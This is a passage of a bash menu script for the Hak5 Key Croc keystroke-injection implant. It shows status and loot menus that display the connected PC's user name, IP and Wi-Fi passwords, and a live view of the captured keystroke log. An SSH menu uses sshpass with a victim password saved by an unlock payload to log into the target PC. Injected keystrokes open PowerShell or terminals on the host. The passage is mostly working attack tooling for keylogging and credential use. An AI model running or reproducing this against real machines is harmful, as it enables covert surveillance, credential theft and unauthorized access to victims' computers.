${LINE}\nRUNNING SERVICES:\n$(service --status-all)\n${LINE}\nINSTALLED PACKAGES:\n$(dpkg-query -l)\n${LINE}\nIDENTIFIER (UUID):\n$(blkid)\n${LINE}\nDIRECTORIES:\n$(ls -la -r /etc /var /root /tmp /usr /sys /bin /sbin)\n${LINE}\nDISPLAY TREE:\n$(pstree)\n${LINE}\nSHELL OPTIONS:\n$(shopt)\n${LINE}\n" >> ${LOOT_INFO}
    cat ${LOOT_INFO}
}

##
#   -Status connected pc info
##

pc_info() {
    CROC_OS=/root/udisk/loot/Croc_OS.txt
    OS_CHECK=$(sed -n 1p ${CROC_OS})
    if [ "${OS_CHECK}" = WINDOWS ]; then
    CROC_OS_WIND=/root/udisk/loot/Croc_OS_wind.txt
echo -ne "\n$(ColorYellow 'KeyCroc is pluged into:') $(sed -n 1p ${CROC_OS})
$(ColorYellow 'PC Host name is:') $(sed -n 3p ${CROC_OS})
$(ColorYellow 'KeyCroc eth0 IP is:') $(sed -n 2p ${CROC_OS})
$(ColorYellow 'Pc user name is:') $(sed -n 7p ${CROC_OS_WIND})
$(ColorYellow 'Pc IP is:') $(sed -n 4p ${CROC_OS_WIND})
$(ColorYellow 'Pc SSID + PASSWD and MAC address is:')
$(sed '9,24!d' ${CROC_OS_WIND})\n"
else
    if [ "${OS_CHECK}" = LINUX ]; then
    croc_os_v=/root/udisk/loot/Croc_OS_ip.txt
echo -ne "\n$(ColorYellow 'KeyCroc is pluged into:') $(sed -n 1p ${CROC_OS})
$(ColorYellow 'PC Host name is:') $(sed -n 3p ${CROC_OS})
$(ColorYellow 'KeyCroc eth0 IP is:') $(sed -n 2p ${CROC_OS})
$(ColorYellow 'Pc user name is:') $(sed -n 1p ${croc_os_v})
$(ColorYellow 'Pc IP is:') $(sed -n 2p ${croc_os_v})
$(ColorYellow 'Pc SSID + PASSWD and MAC address is:') 
$(sed '3,9!d' ${croc_os_v})\n"
else
    echo -ne "$(ColorRed 'PLEASE RUN CROC_POT PAYLOAD TO GET PC USER NAME AND IP')"
 fi
fi
}

##
#   -Status start live keystorke
##

keystorkes_V() {
	echo -ne "\e[40;5m$(ColorYellow 'PRESS COMTROL + C TO EXIT')${clear}"
	sleep 2
	cd loot
	tail -f croc_char.log
	menu_A
}

##
#   - Croc Status Menu
##

menu_A() {
	LED B
MenuTitle KEYCROC STATUS MENU
MenuColor 1 MEMORY USAGE___________
MenuColor 2 CPU LOAD_______________
MenuColor 3 NUMBER OF TCP CONNECTIONS
MenuColor 4 KERNEL VERSION_________
MenuColor 5 RUNNING PROCESSES______
MenuColor 6 CHECK ALL______________
MenuColor 7 CONNECTED PC INFO_______
MenuColor 8 VIEW LIVE KEYSTORKES____
MenuColor 9 RETURN TO MAIN MENU______
MenuEnd
        read a_c
        case $a_c in
        1) memory_check ; menu_A ;;
        2) cpu_check ; menu_A ;;
        3) tcp_check ; menu_A ;;
        4) kernel_check ; menu_A ;;
        5) processes_check ; menu_A ;;
        6) all_checks ; menu_A ;;
        7) pc_info ; menu_A ;;
        8) keystorkes_V ; menu_A ;;
        9) main_menu ;;
        0) exit 0 ;;
        *) invalid_entry ; menu_A ;;
        esac
 }
menu_A
}

##
#   - Edit Files Functions
##

function croc_edit_menu() {
	LED B
	croc_title
	
##
# Edit Payload files Functions
##
	
edit_payload() {
    cd /root/udisk/payloads
    ls -R --color=auto
    ls -aRd $PWD/* --color=auto
    echo ""
    read -p "$(ColorBlue 'ENTER THE PAYLOAD NAME TO EDIT AND PRESS [ENTER]:') " user_payload
    USER_PAYLOAD_V=${user_payload}
    if [ -e "${USER_PAYLOAD_V}" ]; then
    LED SETUP
    nano ${USER_PAYLOAD_V}
else
    invalid_entry
fi
}
    
##
# Edit Tools files Functions
##    
    
edit_tools() {
    cd /root/udisk/tools
    ls -R --color=auto
    ls -aRd $PWD/* --color=auto
    echo ""
    read -p "$(ColorBlue 'ENTER THE FILE NAME TO EDIT AND PRESS [ENTER]:') " user_tools
    USER_TOOLS_V=${user_tools}
    if [ -e "${USER_TOOLS_V}" ]; then
    LED SETUP
    nano ${USER_TOOLS_V}
else
    invalid_entry
fi
}
    
##
# Edit loot files Functions
##    
    
edit_loot() {
    cd /root/udisk/loot
    ls -R --color=auto
    ls -aRd $PWD/* --color=auto
    echo ""
    read -p "$(ColorBlue 'ENTER THE FILE NAME TO EDIT AND PRESS [ENTER]:') " user_loot
    USER_LOOT_V=${user_loot}
    if [ -e "${USER_LOOT_V}" ]; then
    LED SETUP
    nano ${USER_LOOT_V}
else
    invalid_entry
fi
}
    
##
# Edit Config files Functions
##    
    
edit_config() {
    USER_CONFIG_V=/root/udisk/config.txt
    if [ -e "${USER_CONFIG_V}" ]; then
    LED SETUP
    nano ${USER_CONFIG_V}
else
    invalid_entry
fi
}
    
##
# Edit Path To file Functions
##
    
user_file() {
    cd
    ls -aRd $PWD/* --color=auto
    ls -R --color=auto
    echo ""
    read -p "$(ColorBlue 'ENTER THE PATH TO FILE NAME TO EDIT AND PRESS [ENTER]:') " file_edit
    USER_FILE_V=${file_edit}
    if [ -e "${USER_FILE_V}" ]; then
    LED SETUP
    nano ${USER_FILE_V}
else
    invalid_entry
fi
}

##
# Edit remove file Functions
##
    
remove_file() {
	cd
	ls -aRd $PWD/* --color=auto
	ls -R --color=auto
	echo ""
	read -p "$(ColorRed 'ENTER THE PATH TO FILE NAME YOU WISH TO REMOVE AND PRESS [ENTER]:') " remove_edit
	REMOVE_FILE_V=${remove_edit}
	if [ -e "${REMOVE_FILE_V}" ]; then
	LED R
	echo -ne ${LINE_}"\e[40;4;5m$(ColorRed 'This file will be removed') ${REMOVE_FILE_V}${clear}"${LINE_}
	rm -f ${REMOVE_FILE_V}
else
	invalid_entry
fi
}

##
#   - Croc Edit Menu
##
			
	LED B
MenuTitle CROC EDIT MENU
MenuColor  1 CROC PAYLOADS FOLDER__
MenuColor  2 CROC TOOLS FOLDER_____
MenuColor  3 CROC LOOT FOLDER______
MenuColor  4 CROC CONFIG fILE______
MenuColor  5 CROC ENTER FILE NAME___
MenuColor  6 CROC REMOVE FILES_____
MenuColor  7 ATTACKMODE HID STORAGE
MenuColor  8 ATTACKMODE HID_______
MenuColor  9 RELOAD_PAYLOADS_____
MenuColor 10 RETURN TO MAIN MENU___
MenuEnd
        read a_b
        case $a_b in
        1) edit_payload ; croc_edit_menu ;;
        2) edit_tools ; croc_edit_menu ;;
        3) edit_loot ; croc_edit_menu ;;
        4) edit_config ; croc_edit_menu ;;
        5) user_file ; croc_edit_menu ;;
        6) remove_file ; croc_edit_menu ;;
        7) ATTACKMODE HID STORAGE ; croc_edit_menu ;;
        8) ATTACKMODE HID ; croc_edit_menu ;;
        9) RELOAD_PAYLOADS ; croc_edit_menu ;;
       10) main_menu ;;
        0) exit 0 ;;
        *) invalid_entry ; croc_edit_menu ;;
        esac
}

##
#   - SSH function
##

function ssh_menu() {
	hak_gear=/root/udisk/tools/CROC_POT/Hak5Gear.txt
	LED B
	croc_title
	
##
#   - SSH hak5 gear Passwd list
##
	
pw_list() {
	
hak_list() {
	echo -ne "\e[40;34mENTER YOUR ${1} ${2} PASSWD AND PRESS [ENTER]:${clear}"
}
	
hak_passwd() {
    unset hakpassword
    unset hakchartCount
    while IFS= read -r -n1 -s charr; do
    case "$charr" in
    $'\0') break ;;
    $'\177') if [ ${#hakpassword} -gt 0 ]; then
                echo -ne "\b \b"
                hakpassword=${hakpassword::-1}
             fi ;;
          *)    hakchartCount=$((hakchartCount+1))
                echo -n '*'
                hakpassword+="$charr" ;;
    esac
done
echo $hakpassword >> ${hak_gear}
echo ""
}
echo -ne "$(ColorYellow 'Create passwd list for Hak5 gear\n
-wifi pineapple\n
-packet squirrel\n
-lan turtle\n
-signal owl\n
-shark jack\n
-bash bunny\n
This will save your passwd to tools/CROC_POT folder for your hak5 gear\n
This will be used for ssh into your gear\n
This will install (sshpass) package to the keycroc used for enter passwd once\n
First time ssh for Keycroc to hak5 gear you will need to authentication ssh\n
before (sshpass) will work')\n"
> ${hak_gear}
pkg=sshpass
status="$(dpkg-query -W --showformat='${db:Status-Status}' "$pkg" 2>&1)"
if [ ! $? = 0 ] || [ ! "$status" = installed ]; then
  apt install $pkg
fi
hak_list WIFI PINEAPPLE ; hak_passwd
hak_list PACKET SQUIRREL ; hak_passwd
hak_list LAN TURTLE ; hak_passwd
hak_list SIGNAL OWL ; hak_passwd
hak_list SHARK JACK ; hak_passwd
hak_list BASH BUNNY ; hak_passwd
}

##
#   - SSH check for pc passwd
##
	
pc_pw() {
	pw_check=/root/udisk/loot/Croc_Pot/winpasswd.txt
	if [ -e "${pw_check}" ]; then
	    echo -ne "$(ColorYellow 'Have An save Passwd we will try this:') $(sed '$!d' ${pw_check})\n"
	else
	    echo -ne "\e[40;4;5m$(ColorRed 'Run Croc_Unlock Payload to get user passwd')${clear}\n"
	fi
}

##
#   - SSH to connected pc
##
	
pc_ssh() {
	CROC_OS=/root/udisk/loot/Croc_OS.txt
	OS_CHECK=$(sed -n 1p ${CROC_OS})
	pc_pw
	if [ "${OS_CHECK}" = WINDOWS ]; then
	CROC_OS_WIND=/root/udisk/loot/Croc_OS_wind.txt
	$(sed -i 's/\r//g' ${CROC_OS_WIND})
echo -ne "\t$(ColorYellow 'The PC user name is:') $(sed -n 7p ${CROC_OS_WIND})
\t$(ColorYellow 'The PC IP is:') $(sed -n 4p ${CROC_OS_WIND})
\t$(ColorGreen 'Starting SSH with connected PC')\n"
    sshpass -p $(sed '$!d' ${pw_check}) ssh $(sed -n 7p ${CROC_OS_WIND})@$(sed -n 4p ${CROC_OS_WIND})
else
	if [ "${OS_CHECK}" = LINUX ]; then
	CROC_OS_V=/root/udisk/loot/Croc_OS_ip.txt
echo -ne "\t$(ColorYellow 'The PC user name is:') $(sed -n 1p ${CROC_OS_V})
\t$(ColorYellow 'The PC IP is:') $(sed -n 2p ${CROC_OS_V})
\t$(ColorGreen 'Starting SSH with connected PC')\n"
    sshpass -p $(sed '$!d' ${pw_check}) ssh $(sed -n 1p ${CROC_OS_V})@$(sed -n 2p ${CROC_OS_V})
else
	echo -ne "\e[40;4;5m$(ColorRed 'PLEASE RUN CROC_POT PAYLOAD TO GET USER NAME AND IP')${clear}"
	fi
fi
}

userinput_ssh() {
	read -p "$(ColorBlue 'ENTER THE HOST/USER NAME FOR SSH AND PRESS [ENTER]:') " SSH_USER
	read -p "$(ColorBlue 'ENTER THE IP FOR SSH AND PRESS [ENTER]:') " SSH_IP
	ssh ${SSH_USER}@${SSH_IP}
}

##
#   - SSH to wifi pineapple
##

ssh_pineapple() {

ssh_shell() {
	read -p "$(ColorBlue 'ENTER WIFI PINEAPPLE IP FOR SSH AND PRESS [ENTER]:') " PINE
	if [[ "${PINE}" == +([0-9]).+([0-9]).+([0-9]).+([0-9]) ]]; then
	if [ "$(sed -n '1p' ${hak_gear})" != "" ]; then
	sshpass -p $(sed -n 1p ${hak_gear}) ssh root@${PINE}
	fi
else
    if [ "$(sed -n '1p' ${hak_gear})" != "" ]; then
    echo -ne "\e[40;4;5m$(ColorRed 'USING WIFI PINEAPPLE DEFAULT IP 172.16.42.1')${clear}"
	sshpass -p $(sed -n 1p ${hak_gear}) ssh root@172.16.42.1
else
    pw_list
 fi
fi
}

##
#   - SSH start wifi pineapple web UI
##

pine_web() {
	echo -ne "\n$(ColorYellow 'Starting WIFI Pineapple web page')\n"
	CROC_OS=/root/udisk/loot/Croc_OS.txt
	if [ "${OS_CHECK}" = WINDOWS ]; then
	   Q GUI d
	   Q GUI r
	   sleep 1
	   Q STRING "powershell"
	   Q ENTER
	   sleep 2
	   Q STRING "Start-Process http://172.16.42.1:1471"
	   Q ENTER
	   Q ENTER
	   sleep 3
	   Q ALT-TAB
	   sleep 1
	   Q ALT-F4
else
    HOST_CHECK=$(sed -n 3p ${CROC_OS})
      case $HOST_CHECK in
           raspberrypi) 
                      Q CONTROL-ALT-d
                      sleep 1
                      Q STRING "terminal"
                      Q ENTER
                      Q ENTER
                      sleep 1
                      Q STRING "gio open http://172.16.42.1:1471"
                      Q ENTER
                      sleep 3
                      Q ALT-TAB
                      sleep 1
                      Q ALT-F4;;
                parrot)
                      Q ALT F2
                      sleep 1
                      Q STRING "mate-terminal"
                      Q ENTER
                      sleep 1
                      Q STRING "gio open http://172.16.42.1:1471"
                      Q ENTER
                      sleep 3
                      Q ALT-TAB
                      sleep 1
                      Q ALT-F4;;
                     *)
                      Q ALT F2
                      sleep 1
                      Q STRING "xterm"
                      Q ENTER
                      sleep 1
                      Q STRING "gio open http://172.16.42.1:1471"
                      Q ENTER
                      sleep 3
                      Q ALT-TAB
                      sleep 1
                      Q ALT-F4;;                      
esac
fi
}

##
#   - SSH wifi pineapple menu
##

MenuTitle WIFI PINEAPPLE MENU
MenuColor 1 SSH PINEAPPLE____
MenuColor 2 PINEAPPLE WEB____
MenuColor 3 RETURN TO MAIN MENU
MenuEnd
    read w_p
    case $w_p in
	1) ssh_shell ; ssh_menu ;;
	2) pine_web ; ssh_menu ;;
	3) main_menu ;;
	0) exit 0 ;;
	*) invalid_entry ; ssh_menu ;;
        esac
}

##
#   - SSH to packet squirrel
##

ssh_squirrel() {
	read -p "$(ColorBlue 'ENTER PACKET SQUIRREL IP FOR SSH AND PRESS [ENTER]:') " SQUIRREL
	if [[ "${SQUIRREL}" == +([0-9]).+([0-9]).+([0-9]).+([0-9]) ]]; then
	if [ "$(sed -n '2p' ${hak_gear})" != "" ]; then
	sshpass -p $(sed -n 2p ${hak_gear}) ssh root@${SQUIRREL}
	fi
else
    if [ "$(sed -n '2p' ${hak_gear})" != "" ]; then
    echo -ne "\e[40;4;5m$(ColorRed 'USING PACKET SQUIRREL DEFAULT IP 172.16.32.1')${clear}"
	sshpass -p $(sed -n 2p ${hak_gear}) ssh root@172.16.32.1
else
    pw_list
 fi
fi
}

##
#   - SSH to lan turtle
##

ssh_turtle() {
	read -p "$(ColorBlue 'ENTER LAN TURTLE IP FOR SSH AND PRESS [ENTER]:') " TURTLE
	if [[ "${TURTLE}" == +([0-9]).+([0-9]).+([0-9]).+([0-9]) ]]; then
	if [ "$(sed -n '3p' ${hak_gear})" != "" ]; then
	sshpass -p $(sed -n 3p ${hak_gear}) ssh root@${TURTLE}
	fi
else
    if [ "$(sed -n '3p' ${hak_gear})" != "" ]; then
	echo -ne "\e[40;4;5m$(ColorRed 'USING LAN TURTLE DEFAULT IP 172.16.84.1')${clear}"
	sshpass -p $(sed -n 3p ${hak_gear}) ssh root@172.16.84.1
else
    pw_list
 fi
fi
}

##
#   - SSH to signal owl
##

ssh_owl() {
	read -p "$(ColorBlue 'ENTER SIGNAL OWL IP FOR SSH AND PRESS [ENTER]:') " OWL
	if [[ "${OWL}" == +([0-9]).+([0-9]).+([0-9]).+([0-9]) ]]; then
	if [ "$(sed -n '4p' ${hak_gear})" != "" ]; then
	sshpass -p $(sed -n 4p ${hak_gear}) ssh root@${OWL}
	fi
else
    if [ "$(sed -n '4p' ${hak_gear})" != "" ]; then
    echo -ne "\e[40;4;5m$(ColorRed 'USING SIGNAL OWL DEFAULT IP 172.16.56.1')${clear}"
	sshpass -p $(sed -n 4p ${hak_gear}) ssh root@172.16.56.1
else
    pw_list
 fi
fi
}

##
#   - SSH to shark jack
##

ssh_shark() {
	read -p "$(ColorBlue 'ENTER SHARK JACK IP FOR SSH AND PRESS [ENTER]:') " SHARK
	if [[ "${SHARK}" == +([0-9]).+([0-9]).+([0-9]).+([0-9]) ]]; then
	if [ "$(sed -n '5p' ${hak_gear})" != "" ]; then
	sshpass -p $(sed -n 5p ${hak_gear}) ssh root@${SHARK}
	fi
else
    if [ "$(sed -n '5p' ${hak_gear})" != "" ]; then
    echo -ne "\e[40;4;5m$(ColorRed 'USING SHARK JACK DEFAULT IP 172.16.24.1')${clear}"
	sshpass -p $(sed -n 5p ${hak_gear}) ssh root@172.16.24.1
else
    pw_list
 fi
fi
}

##
#   - SSH to bash bunny
##

ssh_bunny() {
	if [ "$(sed -n '6p' ${hak_gear})" != "" ]; then
	   echo "$(ColorYellow 'Bash Bunny passwd found')"
	else
	   echo -ne ${LINE_}"\e[40;4;5m$(ColorRed 'ENTER BASH BUNNY PASSWD')${clear}"${LINE_}
	   pw_list
	fi
	   CROC_OS=/root/udisk/loot/Croc_OS.txt
	if [ "${OS_CHECK}" = WINDOWS ]; then
	   Q GUI d
	   Q GUI r
	   sleep 1
	   Q STRING "powershell"
	   Q ENTER
	   sleep 2
	   Q STRING "ssh root@172.16.64.1"
	   Q ENTER
else
    HOST_CHECK=$(sed -n 3p ${CROC_OS})
      case $HOST_CHECK in
           raspberrypi) 
                      Q CONTROL-ALT-d
                      sleep 1
                      Q STRING "terminal"
                      Q ENTER
                      Q ENTER
                      sleep 1
                      Q STRING "ssh root@172.16.64.1"
                      Q ENTER
                      sleep 1
                      Q STRING $(sed -n '6p' ${hak_gear})
                      Q ENTER;;
                parrot)
                      Q ALT F2
                      sleep 1
                      Q STRING "mate-terminal"
                      Q ENTER
                      sleep 1
                      Q STRING "ssh root@172.16.64.1"
                      Q ENTER
                      sleep 1
                      Q STRING $(sed -n '6p' ${hak_gear})
                      Q ENTER;;
                     *)
                      Q ALT F2
                      sleep 1
                      Q STRING "xterm"
                      Q ENTER
                      sleep 1
                      Q STRING "ssh root@172.16.64.1"
                      Q ENTER
                      sleep 1
                      Q STRING $(sed -n '6p' ${hak_gear})
                      Q ENTER;;                      
esac
fi
}

##
#   - SSH Menu
##
	
	LED B
MenuTitle CROC SSH MENU
MenuColor  1 START SSH WITH CONNECT PC
MenuColor  2 START SSH WITH USER INPUT
MenuColor  3 ENABLE_SSH___________
MenuColor  4 DISABLE_SSH__________
MenuColor  5 WIFI PINEAPPLE________
MenuColor  6 PACKET SQUIRREL_______
MenuColor  7 LAN TURTLE____________
MenuColor  8 SIGNAL OWL____________
MenuColor  9 SHARK JACK____________
MenuColor 10 BASH BUNNY___________
MenuColor 11 RETURN TO MAIN MENU____
MenuEnd
    read ssh_a
    case $ssh_a in
	1) pc_ssh ; ssh_menu ;;
	2) userinput_ssh ; ssh_menu ;;
	3) ENABLE_SSH ; ssh_menu ;;
	4) DISABLE_SSH ; ssh_menu ;;
	5) ssh_pineapple ; ssh_menu ;;
	6) ssh_squirrel ; ssh_menu ;;
	7) ssh_turtle ; ssh_menu ;;
	8) ssh_owl ; ssh_menu ;;
	9) ssh_shark ; ssh_menu ;;
	10) ssh_bunny ; ssh_menu ;;
	11) main_menu ;;
	0) exit 0 ;;
	*) invalid_entry ; ssh_menu ;;
        esac
}

##
#   - Keycroc recovery function
##

function croc_recovery() {

##
#   - Download lastest firmware function
##
	
croc_firmware() {
	echo -ne "$(ColorYellow '-This will Download KeyCroc lastest firmware from Hak5\n
	-Download center and place it in the tools folder\n
	-for later recovery, Download may take some time\n')"
	if [ -e /root/udisk/tools/kc_fw_1.3_510.tar.gz ]; then
	   echo -ne "$(ColorGreen 'KeyCroc lastest firmware file already exists')\n"
	else
	   echo -ne "$(ColorYellow '-Downloading KeyCroc lastest firmware')\n"
	   wget https://storage.googleapis.com/hak5-dl.appspot.com/keycroc/firmwares/1.3-stable/kc_fw_1.3_510.tar.gz -P /root/udisk/tools
fi
}

##
#   - hak5 factory recovery function
##

hak_factory() {
	echo -ne "\n$(ColorYellow 'Open Hak5 factory recovery web page')\n"
	CROC_OS=/root/udisk/loot/Croc_OS.txt
	if [ "${OS_CHECK}" = WINDOWS ]; then
	   Q GUI d
	   Q GUI r
	   sleep 1
	   Q STRING "powershell"
	   Q ENTER
	   sleep 2
	   Q STRING "Start-Process https://docs.hak5.org/hc/en-us/articles/360048657394-Factory-Reset"
	   Q ENTER
	   Q ENTER
else
    HOST_CHECK=$(sed -n 3p ${CROC_OS})
      case $HOST_CHECK in
           raspberrypi) 
                      Q CONTROL-ALT-d
                      sleep 1
                      Q STRING "terminal"
                      Q ENTER
                      Q ENTER
                      sleep 1
                      Q STRING "gio open https://docs.hak5.org/hc/en-us/articles/360048657394-Factory-Reset"
                      Q ENTER;;
                parrot)
                      Q ALT F2
                      sleep 1
                      Q STRING "mate-terminal"
                      Q ENTER
                      sleep 1
                      Q STRING "gio open https://docs.hak5.org/hc/en-us/articles/360048657394-Factory-Reset"
                      Q ENTER;;
                     *)
                      Q ALT F2
                      sleep 1
                      Q STRING "xterm"
                      Q ENTER
                      sleep 1
                      Q STRING "gio open https://docs.hak5.org/hc/en-us/articles/360048657394-Factory-Reset"
                      Q ENTER;;                      
esac
fi
}

##
#   - Restore lastest firmware function
##

restore_firmware() {
	echo -ne "\n$(ColorRed 'THIS WILL RESTORE THE KEYCROC TO THE LATEST FIRMWARE\n
	ARE YOUR YOU SURE YES OR NO AND PRESS [ENTER]:')"
	   read r_f
	   case $r_f in
	   [yY] | [yY][eE][sS] )
	 if [ -e /root/udisk/tools/kc_fw_1.3_510.tar.gz ]; then
	    echo -ne "$(ColorYellow 'Moving Firmware to KeyCroc udisk
	    This will take an couple of minutes')"
	    cp /root/udisk/tools/kc_fw_1.3_510.tar.gz /root/udisk
	    echo -ne "$(ColorGreen 'You can now unplug the KeyCroc and plug back in')\n"
	 else
	    echo -ne "$(ColorRed 'DID NOT FIND KEYCROC FIRMWARE FILE PLEASE DOWNLOAD')\n"
	 fi ;;
	    [nN] | [nN][oO] )
	    echo -ne "\n$(ColorYellow 'Returning back to menu')\n"
	    croc_recovery ;;
	    *)
	    invalid_entry ; restore_firmware ;;
esac
}
	
##
#   - recovery menu
##

MenuTitle KEYCROC RECOVERY MENU
MenuColor 1 DOWNLOAD LATEST FIRMWARE
MenuColor 2 FACTORY RESET HOW TO_____
MenuColor 3 RESTORE LASTEST FIRMWARE
MenuColor 4 REMOVE LASTEST FIRMWARE_
MenuColor 5 RETURN TO MAIN MENU______
MenuEnd
    read c_f
    case $c_f in
	1) croc_firmware ; croc_recovery ;;
	2) hak_factory ; croc_recovery ;;
	3) restore_firmware ; croc_recovery ;;
	4) echo -ne "\n$(ColorYellow 'Removing lastest firmware file from tools folder')\n" ; rm /root/udisk/tools/kc_fw_1.3_510.tar.gz ; croc_recovery ;;
	5) main_menu ;;
	0) exit 0 ;;
	*) invalid_entry ; croc_recovery ;;
	esac
}

##
#   - Croc_Pot Main Menu
##

function main_menu() {
	LED B
	clear
	croc_title
MenuTitle CROC POT MAIN MENU
MenuColor 1 CROC MAIL_____
MenuColor 2 CROC POT PLUS__
MenuColor 3 KEYCROC STATUS
MenuColor 4 KEYCROC LOGS__
MenuColor 5 KEYCROC EDIT__
MenuColor 6 SSH MENU______
MenuColor 7 RECOVERY MENU_
MenuEnd
    read a
    case $a in
	1) croc_mail ;;
	2) croc_pot_plus ;;
	3) croc_status ;;
	4) croc_logs_mean ;;
	5) croc_edit_menu ;;
	6) ssh_menu ;;
	7) croc_recovery ;;
	0) exit 0 ;;
	*) invalid_entry ; main_menu ;;
        esac
}
main_menu
exit
